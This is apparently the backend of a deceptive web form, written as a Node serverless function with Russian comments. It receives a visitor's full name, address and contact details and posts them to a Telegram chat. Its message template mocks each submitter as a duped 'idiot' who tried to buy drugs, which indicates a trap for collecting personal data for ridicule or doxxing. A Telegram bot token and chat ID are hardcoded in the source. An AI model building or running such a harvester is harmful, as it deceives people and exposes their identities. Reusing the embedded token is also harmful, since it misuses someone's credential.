module.exports = async (req, res) => {
  // Разрешаем только POST
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { fio, address, contact } = req.body;

  // ТВОИ ДАННЫЕ
  const BOT_TOKEN = '8040858042:AAHYFzMmMwzXduxH3d39bE767qJ0VH9vcTo'; 
  const CHAT_ID = '-1003591999988';

  const text = `🕵️‍♂️ **НОВЫЙ ДАЛБАЕБИК!**\n\n` +
               `👤 **ФИО:** ${fio}\n` +
               `📍 **Адрес:** ${address}\n` +
               `📞 **Контакт:** ${contact}\n\n` +
               `🤡 *Решил кайфануть, а получил писюном пол лбу от ОАО МЕГАЛЮЛЬ.*`;

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    if (!result.ok) throw new Error(result.description);

    res.status(200).json({ success: true });
  } catch (err) {
    console.error('TG Error:', err.message);
    res.status(500).json({ error: err.message });
  }
};

